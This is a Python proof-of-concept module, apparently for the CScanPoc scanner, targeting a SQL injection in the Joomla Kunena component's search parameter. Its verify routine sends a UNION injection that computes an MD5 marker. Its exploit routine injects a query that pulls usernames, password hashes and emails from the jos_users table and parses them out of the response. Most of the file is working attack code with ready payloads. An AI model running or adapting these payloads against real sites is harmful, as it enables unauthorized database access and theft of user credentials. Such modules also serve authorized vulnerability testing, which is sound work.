# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0059'  # 平台漏洞编号
    # 漏洞名称
    name = 'Joomla Kunena Component (index.php, search parameter) SQL Injection'
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-07-01'  # 漏洞公布时间
    desc = '''
        Joomla Kunena组件在index.php的参数search由于过滤不严格，导致出现SQL注入漏洞。
        远程攻击者可以利用该漏洞执行SQL指令。。
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-75964'
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'f2fa063b-3cdc-4352-ba0b-51a532c64893'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 访问的地址
            exploit = '/index.php?option=com_kunena&func=userlist&search='
            # 利用union的方式（计算md5(3.1415)）
            payload = "%' and 1=2) union select 1, 1,md5(3.1415),1,1,1,1,1,1,1,0,0,0,1,1-- ;"
            # 构造漏洞利用连接
            vulurl = arg+exploit+payload
            # 自定义的HTTP头
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 发送请求
            resp = requests.get(url=vulurl, headers=httphead, timeout=50)
            # 检查是否含有特征字符串(md5(3.1415)=63e1f04640e83605c1d177544a5a0488)
            if '63e1f04640e83605c1d177544a5a0488' in resp.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 访问的地址
            exploit = '/index.php?option=com_kunena&func=userlist&search='
            # 利用Union方式读取信息
            payload = "%' and 1=2) union select 1, 1,concat(0x247e7e7e24,username,"\
                "0x2a2a2a,password,0x2a2a2a,email,0x247e7e7e24),1,1,1,1,1,1,1,0,0,0,1,1 from jos_users limit 0,1-- ;"
            # 构造漏洞利用连接
            vulurl = arg+exploit+payload
            # 自定义的HTTP头
            httphead = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection': 'keep-alive'
            }
            # 提取信息的正则表达式
            parttern = '\$~~~\$(.*)\*\*\*(.*)\*\*\*(.*)\$~~~\$'
            # 发送请求
            resp = requests.get(url=vulurl, headers=httphead, timeout=50)
            # 检查是否含有特征字符串
            if '$~~~$' in resp.text:
                # 提取信息
                match = re.search(parttern, resp.text, re.M | re.I)
                if match:
                    username = match.group(1)
                    password = match.group(2)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到的用户名为{username} 密码为{password}'.format(
                        target=self.target, name=self.vuln.name, username=username, password=password))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
